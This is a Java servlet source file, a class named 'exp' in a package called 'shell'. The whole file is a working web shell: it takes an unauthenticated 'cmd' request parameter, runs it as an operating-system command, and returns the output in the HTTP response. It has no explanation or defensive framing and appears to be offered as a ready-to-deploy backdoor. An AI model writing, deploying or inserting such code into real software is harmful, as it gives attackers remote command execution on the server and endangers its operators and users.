package com.cdl.shell;

import javax.servlet.http.*;
import java.io.InputStream;

public class exp extends javax.servlet.http.HttpServlet {

    public void doGet(HttpServletRequest req, HttpServletResponse res) {
        try {
            String cmd=String.valueOf(req.getParameter("cmd"));
            String output="";
            try {
                if (!cmd.equals("")) {
                    Process p=Runtime.getRuntime().exec(cmd);
                    InputStream out=p.getInputStream();
                    InputStream err=p.getErrorStream();
                    int c='\0';
                    while ((c=out.read()) != -1) {
                        res.getWriter().write((char)c);
                    }
                }
            } catch(Exception ex) {
                output+="\n"+ex.toString();
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

}
